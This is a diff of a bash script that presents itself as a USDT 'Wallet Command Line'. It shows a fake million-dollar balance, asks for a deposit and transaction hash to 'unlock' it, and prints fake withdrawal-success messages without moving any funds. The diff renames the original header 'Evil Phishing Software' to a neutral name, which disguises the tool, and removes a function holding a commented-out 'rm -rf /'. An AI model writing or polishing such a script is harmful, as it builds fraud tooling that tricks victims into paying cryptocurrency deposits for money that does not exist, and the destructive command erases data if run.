@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Evil Phishing Software
+# Wallet Command Line
 
 balance=1000000
 hash_id="d26c9fb3e2738deb32d9d0e1ce0e7427211da34390955883dc2dc24a89603099"
@@ -54,13 +54,13 @@ function unlockBalance {
         echo -e "\e[31mError: Invalid deposit amount or transaction hash ID. Restarting...\e[0m"
         sleep 3
         clear
-        fancyBoxEcho="$welcome_message"
+        fancyBoxEcho "$welcome_message"
         unlockBalance
     fi
 }
 
 function selectNetwork {
-    echo -e "$usdt_logo"
+#    echo -e "$usdt_logo"
     echo "Select network:"
     echo " "
     echo "1. TRC20"
@@ -77,22 +77,33 @@ function selectNetwork {
         *) echo "Invalid choice, please try again."; selectNetwork;;
     esac
 
+    selectWithdrawalAmount
+}
+
+function selectWithdrawalAmount {
+    echo "Select withdrawal amount:"
+    echo "1. 1000000"
+    echo "2. 500000"
+    echo "3. 300000"
+    echo "4. 100000"
+    echo -n "Enter your choice: "
+    read amount_choice
+
+    case $amount_choice in
+        1) amount=1000000;;
+        2) amount=500000;;
+        3) amount=300000;;
+        4) amount=100000;;
+        *) echo "Invalid choice, please try again."; selectWithdrawalAmount;;
+    esac
+
     read -p "Enter your withdrawal address: " withdrawal_address
     echo ""
     echo "Please Wait...."
     sleep 4
-    echo "[+]Withdrawal successful to address $withdrawal_address on $network network.[+]"
+    echo "[+] Withdrawal of $amount USDT successful to address $withdrawal_address on $network network. [+]"
     exit
 }
-
-function evilFunction {
-    echo "Executing evil function..."
-    #rm -rf / # Let us cause some chaos!
-    echo "Evil function executed successfully!"
-    exit
-}
-
-fancyBoxEcho "Current Balance: $balance USDT"
 
 function refresh {
     echo "Refreshing..."
@@ -109,11 +120,5 @@ refresh # Call the refresh function when the script starts
 while true; do
     unlockBalance
 done
-
-if unlockBalance; then
-    for number in range(1, 200); do
-        echo "Unlocking......"
-    done
-fi
 
 exit
